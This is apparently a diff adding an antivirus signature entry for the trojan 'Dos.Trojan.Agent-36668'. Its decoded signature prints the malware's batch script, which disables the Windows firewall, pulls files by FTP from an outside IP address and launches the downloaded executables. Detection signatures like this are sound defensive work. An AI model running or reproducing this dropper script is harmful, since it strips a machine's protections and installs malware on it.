@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36668
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off netsh firewall set opmode disable ftp -s:c:\diuc3.txt 122.224.9.221 start c:\ovbp0ew.exe start c:\ovbp0ew.exe start c:\ovbp0ew.exe start c:\ovbp0ew.exe start c:\ovbp0ew.exe start c:\ovbp0ew2.exe start c:\ovbp0ew3.exe start c:\ovbp0ew4.exe exit 
